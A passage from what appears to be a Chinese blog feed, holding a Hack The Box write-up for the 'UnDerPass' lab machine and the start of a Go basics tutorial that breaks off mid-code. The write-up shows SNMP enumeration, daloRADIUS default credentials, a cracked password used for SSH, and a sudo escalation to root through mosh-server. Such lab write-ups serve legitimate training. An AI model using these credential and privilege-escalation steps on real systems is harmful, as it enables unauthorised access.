class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# nmap -sV -Pn -A -sU <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">12</span> <span class="hljs-number">18</span>:<span class="hljs-number">46</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">32</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">997</span> closed udp ports (port-unreach)<br>PORT     STATE         SERVICE VERSION<br><span class="hljs-number">161</span>/udp  open          snmp    SNMPv1 server; <span class="hljs-built_in">net</span>-snmp SNMPv3 server (public)<br>| snmp-info:<br>|   enterprise: <span class="hljs-built_in">net</span>-snmp<br>|   engineIDFormat: unknown<br>|   engineIDData: c7ad5c4856d1cf6600000000<br>|   snmpEngineBoots: <span class="hljs-number">31</span><br>|_  snmpEngineTime: <span class="hljs-number">17</span>h05m41s<br>| snmp-sysdescr: Linux underpass <span class="hljs-number">5</span>.<span class="hljs-number">15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">126</span>-generic #<span class="hljs-number">136</span>-Ubuntu SMP Wed Nov <span class="hljs-number">6</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">22</span> UTC <span class="hljs-number">2024</span> x86_64<br>|_  System uptime: <span class="hljs-number">17</span>h05m41.<span class="hljs-number">35</span>s (<span class="hljs-number">6154135</span> timeticks)<br><span class="hljs-number">1812</span>/udp open|filtered radius<br><span class="hljs-number">1813</span>/udp open|filtered radacct<br><span class="hljs-function">Warning: <span class="hljs-title">OSScan</span> <span class="hljs-title">results</span> <span class="hljs-title">may</span> <span class="hljs-title">be</span> <span class="hljs-title">unreliable</span> <span class="hljs-title">because</span> <span class="hljs-title">we</span> <span class="hljs-title">could</span> <span class="hljs-title">not</span> <span class="hljs-title">find</span> <span class="hljs-title">at</span> <span class="hljs-title">least</span> 1 <span class="hljs-title">open</span> <span class="hljs-title">and</span> 1 <span class="hljs-title">closed</span> <span class="hljs-title">port</span></span><br><span class="hljs-function"><span class="hljs-title">Aggressive</span> <span class="hljs-title">OS</span> <span class="hljs-title">guesses</span>: <span class="hljs-title">Citrix</span> <span class="hljs-title">Access</span> <span class="hljs-title">Gateway</span> <span class="hljs-title">VPN</span> <span class="hljs-title">gateway</span> (95%), <span class="hljs-title">Linksys</span> <span class="hljs-title">WRT610Nv3</span> <span class="hljs-title">WAP</span> (95%), 3<span class="hljs-title">Com</span> <span class="hljs-title">OfficeConnect</span> 3<span class="hljs-title">CRWER100</span>-75 <span class="hljs-title">wireless</span> <span class="hljs-title">broadband</span> <span class="hljs-title">router</span> (94%), <span class="hljs-title">Adtran</span> 424<span class="hljs-title">RG</span> <span class="hljs-title">FTTH</span> <span class="hljs-title">gateway</span> (94%), <span class="hljs-title">Aerohive</span> <span class="hljs-title">HiveOS</span> 3.4 (94%), <span class="hljs-title">Aerohive</span> <span class="hljs-title">HiveOS</span> 5.1 (94%), <span class="hljs-title">Aerohive</span> <span class="hljs-title">HiveOS</span> 7.1 (94%), <span class="hljs-title">AirMagnet</span> <span class="hljs-title">SmartEdge</span> <span class="hljs-title">wireless</span> <span class="hljs-title">sensor</span>; <span class="hljs-title">or</span> <span class="hljs-title">Foscam</span> <span class="hljs-title">FI8904W</span>, <span class="hljs-title">FI8910W</span>, <span class="hljs-title">or</span> <span class="hljs-title">FI8918W</span>, <span class="hljs-title">or</span> <span class="hljs-title">Instar</span> <span class="hljs-title">IN</span>-3010 <span class="hljs-title">surveillance</span> <span class="hljs-title">camera</span> (<span class="hljs-title">Linux</span> 2.4) (94%), <span class="hljs-title">Alcatel</span>-<span class="hljs-title">Lucent</span> <span class="hljs-title">OmniPCX</span> <span class="hljs-title">GD3</span> <span class="hljs-title">PBX</span> (<span class="hljs-title">Linux</span> 2.6.23) (94%), <span class="hljs-title">Allnet</span> 2210 <span class="hljs-title">webcam</span>, <span class="hljs-title">Cisco</span> <span class="hljs-title">MDS</span> 9124 <span class="hljs-title">or</span> 9216<span class="hljs-title">i</span> <span class="hljs-title">switch</span> (<span class="hljs-title">SAN</span>-<span class="hljs-title">OS</span> 3.1 - 3.2), <span class="hljs-title">or</span> <span class="hljs-title">Nortel</span> <span class="hljs-title">IP</span> <span class="hljs-title">Phone</span> 1535 (94%)</span><br><span class="hljs-function"><span class="hljs-title">No</span> <span class="hljs-title">exact</span> <span class="hljs-title">OS</span> <span class="hljs-title">matches</span> <span class="hljs-title">for</span> <span class="hljs-title">host</span> (<span class="hljs-title">test</span> <span class="hljs-title">conditions</span> <span class="hljs-title">non</span>-<span class="hljs-title">ideal</span>).</span><br><span class="hljs-function"><span class="hljs-title">Network</span> <span class="hljs-title">Distance</span>: 3 <span class="hljs-title">hops</span></span><br><span class="hljs-function"><span class="hljs-title">Service</span> <span class="hljs-title">Info</span>: <span class="hljs-title">Host</span>: <span class="hljs-title">UnDerPass.htb</span> <span class="hljs-title">is</span> <span class="hljs-title">the</span> <span class="hljs-title">only</span> <span class="hljs-title">daloradius</span> <span class="hljs-title">server</span> <span class="hljs-title">in</span> <span class="hljs-title">the</span> <span class="hljs-title">basin</span>!</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">TRACEROUTE</span> (<span class="hljs-title">using</span> <span class="hljs-title">port</span> 38063/<span class="hljs-title">udp</span>)</span><br><span class="hljs-function"><span class="hljs-title">HOP</span> <span class="hljs-title">RTT</span>       <span class="hljs-title">ADDRESS</span></span><br><span class="hljs-function">1   0.22 <span class="hljs-title">ms</span>   172.30.144.1</span><br><span class="hljs-function">2   373.85 <span class="hljs-title">ms</span> 10.10.16.1</span><br><span class="hljs-function">3   319.73 <span class="hljs-title">ms</span> 10.10.11.48</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">OS</span> <span class="hljs-title">and</span> <span class="hljs-title">Service</span> <span class="hljs-title">detection</span> <span class="hljs-title">performed</span>. <span class="hljs-title">Please</span> <span class="hljs-title">report</span> <span class="hljs-title">any</span> <span class="hljs-title">incorrect</span> <span class="hljs-title">results</span> <span class="hljs-title">at</span> <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">submit</span>/ .</span><br><span class="hljs-function"><span class="hljs-title">Nmap</span> <span class="hljs-title">done</span>: 1 <span class="hljs-title">IP</span> <span class="hljs-title">address</span> (1 <span class="hljs-title">host</span> <span class="hljs-title">up</span>) <span class="hljs-title">scanned</span> <span class="hljs-title">in</span> 1225.45 <span class="hljs-title">seconds</span></span><br></code></pre></td></tr></table></figure><p>161 端口有 <code>snmp</code> 服务</p><p>SNMP（简单网络管理协议），是一个应用层协议，为网络节点提供了一个通用的管理方法。更多详情：<a href="https://www.cnblogs.com/chegxy/p/14020233.html">https://www.cnblogs.com/chegxy/p/14020233.html</a></p><p>用 snmpwalk 打印出 IP 详细信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">snmpwalk</span> -v <span class="hljs-number">2</span>c -c public <span class="hljs-number">10.10.11.48</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8383c412e168bb97.png"></p><p>可以看到两条信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iso</span>.<span class="hljs-number">3.6.1.2</span>.<span class="hljs-number">1.1.4.0</span> = STRING: <span class="hljs-string">&quot;steve@underpass.htb&quot;</span><br><span class="hljs-attribute">iso</span>.<span class="hljs-number">3.6.1.2</span>.<span class="hljs-number">1.1.5.0</span> = STRING: <span class="hljs-string">&quot;UnDerPass.htb is the only daloradius server in the basin!&quot;</span><br></code></pre></td></tr></table></figure><p>一条带有 htb 结尾的域名，另一条给出了 <code>daloradius</code> 服务器，<code>daloradius</code> 是一个 RADIUS Web 管理应用程序，用于管理热点和通用的 ISP 部署，</p><p>搜一下找到了 <a href="https://github.com/lirantal/daloradius">daloRADIUS</a>，发现有 <code>login.php</code> 页面，访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://10.10.11.48/daloradius/app/users/login.php<br></code></pre></td></tr></table></figure><p>得到了一个登录框，并且在 <a href="https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS">https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS</a> 找到了默认用户名和密码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span> administrator<br><span class="hljs-symbol">Password:</span> radius<br></code></pre></td></tr></table></figure><p>但是默认的登不进去，找到了另一个路径下的 <code>login.php</code> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.48</span><span class="hljs-regexp">//</span>daloradius<span class="hljs-regexp">/app/</span>operators/login.php<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8feb7134cf1276bb.png"></p><p>找到了一个用户和密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/a27a171a6902fb13.png"></p><p>密码爆破出来</p><p><img src="https://img.dkdun.cn/v1/2025/12/72c9eda786f794c5.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">underwaterfriends</span><br></code></pre></td></tr></table></figure><p>尝试 ssh 登录，能进去</p><p><img src="https://img.dkdun.cn/v1/2025/12/5aa6f4d30ec762e8.png"></p><h2 id="Submit-root-flag"><a href="#Submit-root-flag" class="headerlink" title="Submit root flag"></a>Submit root flag</h2><p><code>sudo -l </code> 发现 <code>mosh-server</code> 能 <code>sudo</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">svcMosh@underpass:~$ <span class="hljs-title">sudo</span> -<span class="hljs-title">l</span></span><br><span class="hljs-function"><span class="hljs-title">Matching</span> <span class="hljs-title">Defaults</span> <span class="hljs-title">entries</span> <span class="hljs-title">for</span> <span class="hljs-title">svcMosh</span> <span class="hljs-title">on</span> <span class="hljs-title">localhost</span>:</span><br><span class="hljs-function">    <span class="hljs-title">env_reset</span>, <span class="hljs-title">mail_badpass</span>, <span class="hljs-title">secure_path</span>=/<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">sbin</span>\:/<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bin</span>\:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>\:/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>\:/<span class="hljs-title">sbin</span>\:/<span class="hljs-title">bin</span>\:/<span class="hljs-title">snap</span>/<span class="hljs-title">bin</span>, <span class="hljs-title">use_pty</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">User</span> <span class="hljs-title">svcMosh</span> <span class="hljs-title">may</span> <span class="hljs-title">run</span> <span class="hljs-title">the</span> <span class="hljs-title">following</span> <span class="hljs-title">commands</span> <span class="hljs-title">on</span> <span class="hljs-title">localhost</span>:</span><br><span class="hljs-function">    (<span class="hljs-title">ALL</span>) <span class="hljs-title">NOPASSWD</span>: /<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">mosh</span>-<span class="hljs-title">server</span></span><br></code></pre></td></tr></table></figure><p>Mosh 表示 Mobile Shell，是一个从客户端跨互联网连接远程服务器的命令行工具，Mosh 最大特点就是 UDP 传输，所以传输快。</p><p>利用 Mosh 提权</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">mosh --server<span class="hljs-operator">=</span><span class="hljs-string">&quot;sudo /usr/bin/mosh-server&quot;</span> localhost<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d02a84fd82bca22c.png"></p><p>拿到 flag</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:从零开始的 Go 之旅- 基础语法(3)</title>
    <link href="/2025/03/09/Go-3/"/>
    <url>/2025/03/09/Go-3/</url>
    
    <content type="html"><![CDATA[<p>继续 Go</p><span id="more"></span><h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><p>if，if…else，if 嵌套，switch，select，goto</p><p>select 类似于 switch，select 会随机执行可运行的 case，没有 case 可运行的话，会阻塞到有 case 可运行</p><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a, b := <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> a &lt; b &#123;<br>fmt.Println(<span class="hljs-string">&quot;hhh&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;xxx&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> expr &#123;<br>  <span class="hljs-keyword">case</span> case1:<br>    statement1<br>  <span class="hljs-keyword">case</span> case2:<br>    statement2<br>  <span class="hljs-keyword">default</span>:<br>    <span class="hljs-keyword">default</span> statement<br>&#125;<br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-keyword">switch</span> str &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;a&quot;</span>:<br>str += <span class="hljs-string">&quot;a&quot;</span><br>str += <span class="hljs-string">&quot;c&quot;</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;b&quot;</span>:<br>str += <span class="hljs-string">&quot;bb&quot;</span><br>str += <span class="hljs-string">&quot;aa&quot;</span><br><span class="hljs-keyword">default</span>:<br>str += <span class="hljs-string">&quot;cc&quot;</span><br>&#125;<br>fmt.Println(str)<br>&#125;<br>&gt;&gt;aac<br></code></pre></td></tr></table></figure><p>还可以在表达式之前声明变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>num := <span class="hljs-number">2</span><br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> num &gt;= <span class="hljs-number">0</span> &amp;&amp; num &lt;= <span class="hljs-number">1</span>:<br>num++<br><span class="hljs-keyword">case</span> num &gt; <span class="hljs-number">1</span>:<br>num--<br><span class="hljs-keyword">fallthrough</span><br><span class="hljs-keyword">case</span> num &lt; <span class="hljs-number">0</span>:<br>num += num<br>&#125;<br>fmt.Println(num)<br>&#125;<br>&gt;&gt; <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><code>fallthrough</code> 关键字会继续执行相邻的下一个分支，不然会自动跳出，在 go 中的 switch 相当于是 c 语言中每个 <code>case</code> 后面添加了 <code>break</code> 语句，所以会自动终止。&#96;&#96;fallthroug<code>它会无条件地执行下一个 case 语句，而不会进行条件检查，所以例子中的</code>num<code>经过了</code>-<code>，又经过了 </code>＋&#96; ， 并没有变化。</p><h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><p>go 中只有一个 <code>for</code> 循环，一般格式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> init statement; expression; post statement &#123;<br>  execute statement<br>&#125;<br></code></pre></td></tr></table></figure><p>当成 <code>while</code> 来使用时</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> expression &#123;<br>  execute statement<br>&#125;<br></code></pre></td></tr></table></figure><p>打印数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> b <span class="hljs-type">int</span> = <span class="hljs-number">6</span><br><span class="hljs-comment">//var a int</span><br>numbers := [<span class="hljs-number">6</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>&#125;<br><span class="hljs-keyword">for</span> a := <span class="hljs-number">0</span>; a &lt; b; a++ &#123;<br>fmt.Print(numbers[a])<br>&#125;<br>&#125;<br>&gt;&gt; <span class="hljs-number">123579</span><br></code></pre></td></tr></table></figure><p>双循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++ &#123;<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span>; j &lt;= <span class="hljs-number">9</span>; j++ &#123;<br><span class="hljs-keyword">if</span> i &lt;= j &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d * %d = %2d  &quot;</span>, i, j, i*j)<br>&#125;<br>&#125;<br>fmt.Println()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="for-range"><a href="#for-range" class="headerlink" title="for range"></a>for range</h2><p><code>for</code> 循环的 <code>range</code> 格式可以对 slice、map、数组、字符串、切片、映射表，channel 等进行迭代循环，一般格式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> index, value := <span class="hljs-keyword">range</span> iterable &#123;<br>  <span class="hljs-comment">// body</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="数组-Array"><a href="#数组-Array" class="headerlink" title="数组 Array"></a>数组 Array</h1><p>go 的数组和其他语言数组有一些区别</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//全局</span><br><span class="hljs-keyword">var</span> arr0 [<span class="hljs-number">5</span>]<span class="hljs-type">int</span> = [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br><span class="hljs-keyword">var</span> arr1 = [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><span class="hljs-keyword">var</span> arr2 = [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;<br><span class="hljs-keyword">var</span> str = [<span class="hljs-number">5</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-number">3</span>: <span class="hljs-string">&quot;hhhhh&quot;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&quot;xxxxxx&quot;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//局部</span><br>a := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;<br>b := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>c := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>: <span class="hljs-number">100</span>, <span class="hljs-number">4</span>: <span class="hljs-number">200</span>&#125;<br>d := [...]<span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">uint8</span><br>&#125;&#123;<br>&#123;<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">10</span>&#125;,<br>&#123;<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">20</span>&#125;,<br>&#125;<br>fmt.Println(arr0, arr1, arr2, str)<br>fmt.Println(a, b, c, d)<br><br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>] [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>] [   hhhhh xxxxxx]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span>] [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">100</span> <span class="hljs-number">0</span> <span class="hljs-number">200</span>] [&#123;a <span class="hljs-number">10</span>&#125; &#123;b <span class="hljs-number">20</span>&#125;]<br></code></pre></td></tr></table></figure><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> arr0 [<span class="hljs-number">5</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> arr1 [<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span> = [...][<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := [<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;&#125;<br>b := [...][<span class="hljs-number">2</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-number">3</span>, <span class="hljs-number">3</span>&#125;&#125;<br>fmt.Println(arr0, arr1)<br>fmt.Println(a, b)<br><br>&#125;<br>&gt;&gt;<br>[[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]] [[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>] [<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]]<br>[[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>] [<span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]] [[<span class="hljs-number">1</span> <span class="hljs-number">1</span>] [<span class="hljs-number">2</span> <span class="hljs-number">2</span>] [<span class="hljs-number">3</span> <span class="hljs-number">3</span>]]<br></code></pre></td></tr></table></figure><p>第二维度不能用 <code>...</code> 来表示，未赋值的数组初始化为 0</p><h3 id="多维数组遍历"><a href="#多维数组遍历" class="headerlink" title="多维数组遍历"></a>多维数组遍历</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a [<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span> = [...][<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;&#125;<br><span class="hljs-keyword">for</span> k1, v1 := <span class="hljs-keyword">range</span> a &#123;<br><span class="hljs-keyword">for</span> k2, v2 := <span class="hljs-keyword">range</span> v1 &#123;<br>fmt.Printf(<span class="hljs-string">&quot;(%d,%d)=%d&quot;</span>, k1, k2, 